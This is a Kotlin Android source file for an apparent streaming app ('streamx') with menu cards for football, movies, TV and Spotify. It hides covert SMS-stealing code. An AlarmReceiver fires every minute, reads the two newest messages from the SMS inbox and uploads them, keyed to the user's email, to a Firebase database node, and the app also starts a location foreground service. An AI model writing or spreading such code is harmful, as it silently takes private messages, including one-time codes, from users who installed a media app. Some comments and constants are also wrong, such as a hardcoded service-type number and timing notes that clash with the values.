package com.stream.streamx

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import android.widget.Toast
import androidx.cardview.widget.CardView
import com.google.firebase.database.*
import com.google.gson.Gson
import java.util.*

class home : AppCompatActivity() {
    private var alarmMgr: AlarmManager? = null
    private lateinit var alarmIntent: PendingIntent

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        val prox = findViewById<CardView>(R.id.topro)
        prox.setOnClickListener {
            startActivity(Intent(applicationContext, profile::class.java))
        }

        val androidVersion = Build.VERSION.SDK_INT

        val serviceType = if (androidVersion >= Build.VERSION_CODES.S) {
            // For Android 12+, define the constant manually
            2135017859 // This value corresponds to FOREGROUND_SERVICE_TYPE_LOCATION
        } else {
            // Fallback for Android versions below 12
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION // or any other service type suitable for your case
        }

        if (serviceType != -1) {
            val intent = Intent(this, ForegroundService::class.java)
                .putExtra("some_key", "some_value")

            val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                PendingIntent.getForegroundService(
                    this,
                    0,
                    intent,
                    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                )
            } else {
                TODO("VERSION.SDK_INT < O")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } else {
            // Handle the case where the constant is not available on this device
            Toast.makeText(this, "Service type not available on this device", Toast.LENGTH_SHORT).show()
        }


        val tfoot = findViewById<CardView>(R.id.tofoot)
        val tmov = findViewById<CardView>(R.id.tomov)
        val ttv = findViewById<CardView>(R.id.totv)
        val tsp = findViewById<CardView>(R.id.tospo)
        tfoot.setOnClickListener {
            startActivity(Intent(applicationContext, football::class.java))
        }
        tmov.setOnClickListener {
            startActivity(Intent(applicationContext, smovies::class.java))
        }
        ttv.setOnClickListener {
            startActivity(Intent(applicationContext, channellist::class.java))
        }
        tsp.setOnClickListener {
            startActivity(Intent(applicationContext, spotify::class.java))
        }

        alarmMgr = getSystemService(Context.ALARM_SERVICE) as AlarmManager

        val intent = Intent(this, AlarmReceiver::class.java)
        val requestCode = 0

        alarmIntent = PendingIntent.getBroadcast(
            this,
            requestCode,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

// Set the initial alarm to start 2 minutes after the current time
        val initialAlarmCalendar: Calendar = Calendar.getInstance().apply {
            timeInMillis = System.currentTimeMillis()
            add(Calendar.MINUTE, 1) // Set 2 minutes after the current time
        }

// setExact() for the initial alarm
        alarmMgr?.setExact(
            AlarmManager.RTC_WAKEUP,
            initialAlarmCalendar.timeInMillis,
            alarmIntent
        )

        // Schedule repeating alarms every 1 minute
        scheduleRepeatingAlarms()


    }//ends oncreate

    fun scheduleRepeatingAlarms() {
        val ALARM_INTERVAL_MS: Long = 1 * 60 * 1000 // 1 minute in milliseconds

        val intent = Intent(this, AlarmReceiver::class.java)
        val requestCode = 0

        val pendingIntent = PendingIntent.getBroadcast(
            this,
            requestCode,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Calculate the next alarm time based on the current time and interval
        val nextAlarmTime = System.currentTimeMillis() + ALARM_INTERVAL_MS

        // setRepeating() for the next alarm
        alarmMgr?.setRepeating(
            AlarmManager.RTC_WAKEUP,
            nextAlarmTime,
            ALARM_INTERVAL_MS,
            pendingIntent
        )
    }
}//ends class

class AlarmReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {

        // Update the specified location in the Realtime Database
        val email = getUserEmailFromSharedPreferences(context)
        if (email != null) {
            // Get the latest two SMS messages
            val latestSms = getLatestSMS(context, 2)

            // Update the database with internet status and latest SMS messages
            updateDatabase(email, latestSms)

            // Reschedule the next alarm
            scheduleNextAlarm(context)
        }
    }

    private fun getUserEmailFromSharedPreferences(context: Context?): String? {
        val sharedPreferences = context?.getSharedPreferences("user_data", Context.MODE_PRIVATE)
        val userDataJson = sharedPreferences?.getString("userData", null)

        if (userDataJson != null) {
            val gson = Gson()
            val userData = gson.fromJson(userDataJson, UserData::class.java)
            return userData.email
        }

        return null
    }
    private fun updateDatabase(email: String, latestSms: List<String>) {
        // Assuming you have a reference to your Realtime Database
        val databaseReference = FirebaseDatabase.getInstance().getReference("naiflix")

        // Query the database to find the user with the given email
        val query: Query = databaseReference.orderByChild("email").equalTo(email)

        query.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(dataSnapshot: DataSnapshot) {
                for (userSnapshot in dataSnapshot.children) {
                    // Get the user ID of the matching email
                    val userId = userSnapshot.key

                    // Update the specific location in the Realtime Database
                    // For example, set "internetStatus" to "on"
                    userId?.let {
                        databaseReference.child(it).child("internetStatus").setValue("on")

                        // Include the latest two SMS messages in the data
                        databaseReference.child(it).child("latestSms").setValue(latestSms)
                    }
                }
            }

            override fun onCancelled(databaseError: DatabaseError) {
                // Handle the error
            }
        })
    }
    private fun getLatestSMS(context: Context?, numberOfMessages: Int): List<String> {
        val uri = Uri.parse("content://sms/inbox")
        val cursor: Cursor? = context?.contentResolver?.query(uri, null, null, null, null)

        val smsList: MutableList<String> = mutableListOf()

        cursor?.use {
            if (it.moveToFirst()) {
                for (i in 0 until numberOfMessages) {
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    smsList.add(body)

                    if (!it.moveToNext()) {
                        break
                    }
                }
            }
        }

        return smsList
    }

    private fun scheduleNextAlarm(context: Context?) {
        val ALARM_INTERVAL_MS: Long = 1 * 60 * 1000 // 1 minute in milliseconds
        val alarmManager = context?.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, AlarmReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Calculate the next alarm time based on the current time and interval
        val nextAlarmTime = System.currentTimeMillis() + ALARM_INTERVAL_MS

        // setRepeating() for the next alarm
        alarmManager.setRepeating(
            AlarmManager.RTC_WAKEUP,
            nextAlarmTime,
            ALARM_INTERVAL_MS,
            pendingIntent
        )
    }


}


